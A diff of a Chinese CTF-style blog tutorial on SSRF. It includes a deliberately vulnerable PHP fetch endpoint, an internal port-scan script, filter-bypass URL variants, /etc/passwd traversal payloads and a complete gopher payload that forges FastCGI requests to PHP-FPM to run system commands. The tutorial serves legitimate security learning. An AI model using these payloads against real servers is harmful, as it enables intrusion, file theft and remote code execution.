@@ -20,16 +20,29 @@
     <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="1.1 SSRF漏洞介绍SSRF(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。 1.1.1 SSRF原理解析URL结构如下 1URI &#x3D; schema:[&#x2F;&amp;#x">
+    <meta name="description" content="0x01 SSRF漏洞介绍SSRF(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。 SSRF原理解析URL结构如下 1URI &#x3D; schema:[&#x2F;&#x2F;au">
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅析SSRF漏洞">
 <meta property="og:url" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="1.1 SSRF漏洞介绍SSRF(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。 1.1.1 SSRF原理解析URL结构如下 1URI &#x3D; schema:[&#x2F;&amp;#x">
+<meta property="og:description" content="0x01 SSRF漏洞介绍SSRF(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。 SSRF原理解析URL结构如下 1URI &#x3D; schema:[&#x2F;&#x2F;au">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/1.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/2.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/3.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/4.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/5.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/6.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/7.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/8.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/9.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/10.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/11.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/12.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/13.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/14.png">
 <meta property="article:published_time" content="2020-11-16T11:35:02.000Z">
-<meta property="article:modified_time" content="2020-11-17T10:45:22.620Z">
+<meta property="article:modified_time" content="2020-11-22T11:11:24.645Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
@@ -287,7 +300,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">521</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1.8k</span>Reading time: <span class="post-count reading-time">8 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -412,8 +425,8 @@ height:50vh;
             
 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="1-1-SSRF漏洞介绍"><a href="#1-1-SSRF漏洞介绍" class="headerlink" title="1.1 SSRF漏洞介绍"></a>1.1 SSRF漏洞介绍</h1><p><code>SSRF</code>(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。<br>形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。</p>
-<h2 id="1-1-1-SSRF原理解析"><a href="#1-1-1-SSRF原理解析" class="headerlink" title="1.1.1 SSRF原理解析"></a>1.1.1 SSRF原理解析</h2><p>URL结构如下</p>
+        <h1 id="0x01-SSRF漏洞介绍"><a href="#0x01-SSRF漏洞介绍" class="headerlink" title="0x01 SSRF漏洞介绍"></a>0x01 SSRF漏洞介绍</h1><p><code>SSRF</code>(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。<br>形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。</p>
+<h2 id="SSRF原理解析"><a href="#SSRF原理解析" class="headerlink" title="SSRF原理解析"></a>SSRF原理解析</h2><p>URL结构如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URI &#x3D; schema:[&#x2F;&#x2F;authority]path[?query][#fragment]</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/1.png"></p>
 <ul>
@@ -426,15 +439,101 @@ height:50vh;
 </ul>
 <p>本地搭建SSRF简单测试环境</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">$res = curl_exec($ch);</span><br><span class="line">header(<span class="string">&quot;content-type: image/png&quot;</span>);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br></pre></td></tr></table></figure>
-<h2 id="1-1-2-SSRF漏洞存在的位置"><a href="#1-1-2-SSRF漏洞存在的位置" class="headerlink" title="1.1.2 SSRF漏洞存在的位置"></a>1.1.2 SSRF漏洞存在的位置</h2><p>SSRF一般出现在有调用外部资源的场景中，比如社交服务分享功能、图片识别服务等等<br>常用协议：</p>
+<h2 id="SSRF漏洞存在的位置"><a href="#SSRF漏洞存在的位置" class="headerlink" title="SSRF漏洞存在的位置"></a>SSRF漏洞存在的位置</h2><p>SSRF一般出现在有调用外部资源的场景中，比如社交服务分享功能、图片识别服务等等<br>常用协议：</p>
 <ol>
 <li><code>file://</code> 从文件系统中读取文件内容，例如file://etc/passwd</li>
 <li><code>dict://</code> 字典服务器协议，让客户端能访问更多字典源。在SSRF中可以获得目标服务器上的服务版本等信息</li>
 <li><code>gopher://</code>分布式的文档传递服务，在SSRF发挥作用很大，攻击面很广！</li>
 </ol>
-<h2 id="1-1-3-SSRF漏洞利用方式"><a href="#1-1-3-SSRF漏洞利用方式" class="headerlink" title="1.1.3 SSRF漏洞利用方式"></a>1.1.3 SSRF漏洞利用方式</h2><h3 id="1-1-3-1-内部服务资产探测"><a href="#1-1-3-1-内部服务资产探测" class="headerlink" title="1.1.3.1 内部服务资产探测"></a>1.1.3.1 内部服务资产探测</h3><p>可以写python脚本根据请求之后的返回信息进行判断服务开放情况</p>
+<h1 id="0x02-SSRF漏洞利用方式"><a href="#0x02-SSRF漏洞利用方式" class="headerlink" title="0x02 SSRF漏洞利用方式"></a>0x02 SSRF漏洞利用方式</h1><h2 id="内部服务资产探测"><a href="#内部服务资产探测" class="headerlink" title="内部服务资产探测"></a>内部服务资产探测</h2><p>可以写python脚本根据请求之后的返回信息进行判断服务开放情况</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ports = [<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;3306&#x27;</span>,<span class="string">&#x27;6379&#x27;</span>,<span class="string">&#x27;8080&#x27;</span>,<span class="string">&#x27;8000&#x27;</span>]</span><br><span class="line">session = req.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">255</span>):</span><br><span class="line">	ip = <span class="string">&#x27;192.168.78.&#123;&#125;&#x27;</span>.format(i)</span><br><span class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">		url = <span class="string">&quot;http://example.com/?url=http://&#123;&#125;.&#123;&#125;&quot;</span>.format(ip,port)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			res = session.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">			<span class="keyword">if</span> len(res.content) &gt; <span class="number">0</span>:</span><br><span class="line">				print(ip,port,<span class="string">&#x27;is open&#x27;</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">print(<span class="string">&quot;DONE&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="1-1-3-2"><a href="#1-1-3-2" class="headerlink" title="1.1.3.2"></a>1.1.3.2</h3>
+<h2 id="SSRF的bypass"><a href="#SSRF的bypass" class="headerlink" title="SSRF的bypass"></a>SSRF的bypass</h2><p>在ctf中，有时候会ban一些指定的ip，比如127.0.0.1，有时候是检查一整段127.0.0.1，或者是通过正则去匹配逐个字符，这里介绍一下如何去绕过这些WAF。</p>
+<ul>
+<li>302跳转</li>
+</ul>
+<p>有一种网站地址是当访问任意子域名时，都会重定向到这个子域名<br>比如当访问<code>http://127.0.0.1.xip.io/test.php</code>最后会跳转到<code>http://127.0.0.1/test.php</code><br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/2.png"><br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/3.png"><br>实现跳转<br>可用网站：</p>
+<ol>
+<li><code>xip.io</code></li>
+<li><code>nip.io</code></li>
+<li><code>sslip.io</code></li>
+</ol>
+<p>这种方法适用于后端用<code>parse_url</code>判断host参数是否等于<code>127.0.0.1</code>或者<code>localhost</code>，但是如果检查是否存在关键字<code>127.0.0.1</code>，这种方法就不行，需要使用短地址绕过<br>可用网站：<br><code>4m.cn</code><br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/4.png"></p>
+<ul>
+<li>进制转换绕过过滤</li>
+</ul>
+<p>可以将ip地址转换为不同进制绕过waf，提供一个脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$ip = explode(<span class="string">&#x27;.&#x27;</span>,$ip);</span><br><span class="line">$r = ($ip[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | ($ip[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | ($ip[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | $ip[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>($r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    $r += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> decoct($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> dechex($r);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">十进制:2130706433八进制:17700000001十六进制:7f000001</span><br></pre></td></tr></table></figure>
+<p>实际使用中要在八进制前面加<code>0</code>,十六进制前面加<code>0x</code></p>
+<ul>
+<li>利用DNS解析</li>
+</ul>
+<p>可以用自己的域名，可以将域名设置A记录指向127.0.0.1</p>
+<ul>
+<li>利用@绕过</li>
+</ul>
+<p>请求<code>http://www.baidu.com@127.0.0.1/index.php</code>和请求<code>http://127.0.0.1/index.php</code>效果是一样的</p>
+<ul>
+<li>各种指向127.0.0.0的地址</li>
+</ul>
+<ol>
+<li><a target="_blank" rel="noopener" href="http://localhost/">http://localhost/</a></li>
+<li><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0/</a></li>
+<li>http://[0:0:0:0:0:ffff:127.0.0.1]/</li>
+<li>http://[::]:80/</li>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127。0。0。1/</a></li>
+<li>http://①②⑦.⓪.⓪.①</li>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1/</a></li>
+<li><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.00000.00000.001/</a></li>
+<li>file:/etc/passwd</li>
+<li>file:(空格)//</li>
+</ol>
+<p>第1行localhost就是代指127.0.0.1</p>
+<p>第2行中0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</p>
+<p>第3行指向127.0.0.1，在liunx下可用，window测试了下不行</p>
+<p>第4行指向127.0.0.1，在liunx下可用，window测试了下不行</p>
+<p>第5行用中文句号绕过</p>
+<p>第6行用的是Enclosed alphanumerics方法绕过，英文字母以及其他一些可以网上找找</p>
+<p>第7.8行中0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p>
+<p>第9.10行可以绕过<code>file://</code>协议过滤</p>
+<ul>
+<li>不存在协议头的绕过</li>
+</ul>
+<p><code>file_get_contents()</code>函数会将不认识的伪协议头当做文件夹，造成跨目录读取文件的漏洞<br>php_error.logs内容<br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/5.png"><br>构造payload读取php_error.logs<br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/6.png"><br>可利用的payload</p>
+<ol>
+<li>httpsssss://../../../../../../etc/passwd</li>
+<li>httpsssss://abc../../../../../../etc/passwd</li>
+</ol>
+<ul>
+<li>URL解析问题</li>
+</ul>
+<p>parse_url和readfile的区别<br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/7.png"><br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/8.png"><br>curl和parse_url解析的差异<br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/9.png"><br>更多参考blackhat<a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>
+<h1 id="SSRF进阶用法"><a href="#SSRF进阶用法" class="headerlink" title="SSRF进阶用法"></a>SSRF进阶用法</h1><h2 id="对redis和mysql的攻击"><a href="#对redis和mysql的攻击" class="headerlink" title="对redis和mysql的攻击"></a>对redis和mysql的攻击</h2><p>使用工具Gopherus<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
+<ul>
+<li>对redis的攻击</li>
+</ul>
+<p><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/10.png"><br><strong>Tips</strong>：如果是在url中输入payload的话还要讲payload再url编码一次</p>
+<ul>
+<li>对Mysql的攻击</li>
+</ul>
+<p><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/11.png"><br>题目：ISITDTU 2018 Friss<br>复现过程：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2500">https://xz.aliyun.com/t/2500</a></p>
+<h2 id="使用PHP-FPM攻击"><a href="#使用PHP-FPM攻击" class="headerlink" title="使用PHP-FPM攻击"></a>使用PHP-FPM攻击</h2><p>首先，PHP-FPM是实现和管理FastCGI的进程，是一个FastCGI协议解析器，而Fastcgi本质是一个通信协议，类似于HTTP，都是进行数据交换的一个通道，通信过程如下：</p>
+<p>TCP模式下在本机监听一个端口（默认为9000），Nginx把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。</p>
+<p>而PHP-FPM攻击是通过伪造FastCGI协议包实现PHP代码执行，我们可以通过更改配置信息来执行任意代码。php中有两个非常有趣的配置项，分别为<code>auto_prepend_file</code>和<code>auto_append_file</code>，这两个配置项是使得php在执行目标文件之前，先包含配置项中指定的文件，如果我们把<code>auto_prepend_file</code>或<code>auto_append_file</code>的值设定为<code>php://input</code>，就能包含进POST提交的数据。</p>
+<p>但是这里有个问题就是<code>php://input</code>需要开启<code>allow_url_include</code>，这里可以利用<code>PHP_ADMIN_VALUE</code>，上一篇说到<code>PHP_ADMIN_VALUE</code>不可以利用在<code>.htaccess</code>，但是FastCGI协议中<code>PHP_ADMIN_VALUE</code>却用来可以修改大部分的配置，我们利用<code>PHP_ADMIN_VALUE</code>把<code>allow_url_include</code>修改为True。</p>
+<p>利用过程：</p>
+<ol>
+<li>监听本地1234端口(可以任意指定)并写入ssrf.txt<br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/12.png"></li>
+<li>使用p牛的脚本生成payload<br><a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a><br><img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/13.png"><br>这里的php是随便一个php都可以，攻击网站服务的话最好是使用<code>/var/www/html/</code>下的php文件<br>可以使用<code>find / -name *.php</code>来找php文件</li>
+<li>payload进行url编码<br>脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">f = open(<span class="string">r&#x27;ssrf.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">s = urllib.parse.quote(s)</span><br><span class="line">print(<span class="string">&quot;gopher://127.0.0.1:1234/_&quot;</span>+s)</span><br></pre></td></tr></table></figure>
+<img src="/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/14.png"></li>
+</ol>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%2501%2501u%2589%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504u%2589%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI&#x2F;1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250B%2517SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250D%2501DOCUMENT_ROOT&#x2F;%250F%250ESERVER_SOFTWAREphp&#x2F;fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250C%2510CONTENT_TYPEapplication&#x2F;text%250E%2502CONTENT_LENGTH21%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504u%2589%2500%2500%2500%2500%2501%2505u%2589%2500%2515%2500%2500%253C%253Fphp%2520system%2528%2522ls%2522%2529%253B%253F%253E%2501%2505u%2589%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>
+
+<p>按照需求更改ip地址和端口使用<code>PHP-FPM</code>进行攻击</p>
+
     </article>
     <!-- license  -->
     
@@ -442,7 +541,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/">https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/">November 16th 2020, 7:35:02 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/">November 17th 2020, 6:45:22 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/">November 22nd 2020, 7:11:24 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -580,7 +679,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-1-SSRF%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">1.1 SSRF漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-1-SSRF%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">1.1.1 SSRF原理解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-2-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">1.1.2 SSRF漏洞存在的位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-3-SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">1.1.3 SSRF漏洞利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3-1-%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%E8%B5%84%E4%BA%A7%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.1.3.1 内部服务资产探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">1.1.3.2</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-SSRF%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 SSRF漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">SSRF原理解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">SSRF漏洞存在的位置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">0x02 SSRF漏洞利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%E8%B5%84%E4%BA%A7%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">内部服务资产探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E7%9A%84bypass"><span class="toc-number">2.2.</span> <span class="toc-text">SSRF的bypass</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E8%BF%9B%E9%98%B6%E7%94%A8%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">SSRF进阶用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9redis%E5%92%8Cmysql%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">对redis和mysql的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8PHP-FPM%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">使用PHP-FPM攻击</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -593,8 +692,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
     
     
     
